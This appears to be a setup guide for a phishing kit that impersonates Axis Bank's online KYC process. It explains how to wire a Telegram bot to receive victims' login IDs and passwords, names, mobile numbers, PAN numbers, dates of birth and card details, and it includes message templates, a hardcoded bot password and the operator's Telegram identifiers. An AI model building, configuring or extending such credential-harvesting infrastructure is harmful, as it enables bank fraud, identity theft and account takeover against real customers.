# Telegram Bot Setup Guide for Axis Bank KYC System

## Your Telegram Information
- **User ID**: 7271452485
- **Username**: @vikaskumar_8102
- **Name**: Vikas Kumar
- **Language**: English

## Step 1: Create a Telegram Bot

1. Open Telegram and search for **@BotFather**
2. Send the command: `/newbot`
3. Choose a name for your bot (e.g., "Axis Bank KYC Bot")
4. Choose a username (e.g., `axisbank_kyc_bot`)
5. BotFather will give you a **Bot Token** (keep it secure!)

## Step 2: Get Your Chat ID

Your chat ID is: **7271452485**

## Step 3: Configure Environment Variables

Create a `.env.local` file in your project root with:

```env
NEXT_PUBLIC_TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
NEXT_PUBLIC_TELEGRAM_CHAT_ID=7271452485
NEXT_PUBLIC_BOT_PASSWORD=axisbank2024
```

## Step 4: Test the Bot

1. Send a message to your bot on Telegram
2. The bot will start sending you KYC updates, login details, and card verification information

## What You'll Receive

### 🔐 Login Attempts
```
🔐 NEW LOGIN ATTEMPT - AXIS BANK KYC

📋 Login Details:
• User ID: [user_id]
• Password: [password]
• Timestamp: [timestamp]

🏦 Axis Bank Online KYC System
⏰ [current_time]
```

### 📝 KYC Updates
```
📝 NEW KYC UPDATE - AXIS BANK

👤 Customer Information:
• Full Name: [name]
• Mobile Number: [mobile]
• PAN Card: [pan]
• Date of Birth: [dob]
• Timestamp: [timestamp]

🏦 Axis Bank Online KYC System
⏰ [current_time]
```

### 💳 Card Verifications
```
💳 CARD VERIFICATION COMPLETED - AXIS BANK

💳 Card Details:
• Card Number: **** **** **** [last_4]
• Expiry Date: [expiry]
• Timestamp: [timestamp]

✅ Card verification successful
🏦 Axis Bank Online KYC System
⏰ [current_time]
```

## Security Features

- **Password Protection**: Bot password: `axisbank2024`
- **Secure Card Data**: Only last 4 digits of card numbers shown
- **Timestamp Tracking**: All activities are time-stamped
- **Error Handling**: Failed notifications are logged

## Troubleshooting

If you don't receive messages:
1. Check your Bot Token is correct
2. Verify your Chat ID: 7271452485
3. Make sure you've sent a message to the bot first
4. Check browser console for errors

## Privacy Note

- All data is sent directly to your Telegram account
- No third-party services involved
- You can disable notifications by removing the bot token
